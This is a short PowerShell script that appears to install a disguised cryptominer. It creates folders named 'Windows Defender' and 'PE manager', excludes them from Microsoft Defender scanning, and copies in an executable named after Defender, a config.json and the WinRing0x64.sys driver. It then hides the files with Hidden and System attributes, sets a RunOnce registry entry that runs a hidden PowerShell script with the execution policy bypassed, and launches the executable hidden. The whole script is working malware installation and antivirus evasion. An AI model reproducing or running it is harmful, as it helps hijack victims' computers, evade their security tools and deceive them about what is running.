$folder1 = "$env:LOCALAPPDATA\Windows Defender"
$folder2 = "$env:LOCALAPPDATA\PE manager"
$file1 = "$env:LOCALAPPDATA\PE manager\Msvcdefend.ps1"
$file2 = "$env:LOCALAPPDATA\Windows Defender\Windows Defender.exe"
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"

if (-not (Test-Path $folder1)) {
    New-Item -ItemType Directory -Path $folder1 | Out-Null
}
if (-not (Test-Path $folder2)) {
    New-Item -ItemType Directory -Path $folder2 | Out-Null
}

Add-MpPreference -ExclusionPath $folder1
Add-MpPreference -ExclusionPath $folder2

$SourceDir = $PSScriptRoot
Copy-Item "$SourceDir\Windows Defender.exe" -Destination $folder1 -Force
Copy-Item "$SourceDir\config.json" -Destination $folder1 -Force
Copy-Item "$SourceDir\WinRing0x64.sys" -Destination $folder1 -Force
Copy-Item "$SourceDir\Windows Defender.exe" -Destination $folder2 -Force
Copy-Item "$SourceDir\config.json" -Destination $folder2 -Force
Copy-Item "$SourceDir\WinRing0x64.sys" -Destination $folder2 -Force
Copy-Item "$SourceDir\Msvcdefend.ps1" -Destination $folder2 -Force

(Get-Item $folder1).Attributes += 'Hidden','System'
(Get-Item $file1).Attributes += 'Hidden','System'

$command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$file1`""
Set-ItemProperty -Path $RunOnceKey -Name "Windows Defender" -Value $command -Type String
Start-Process $file2 -WindowStyle Hidden
exit
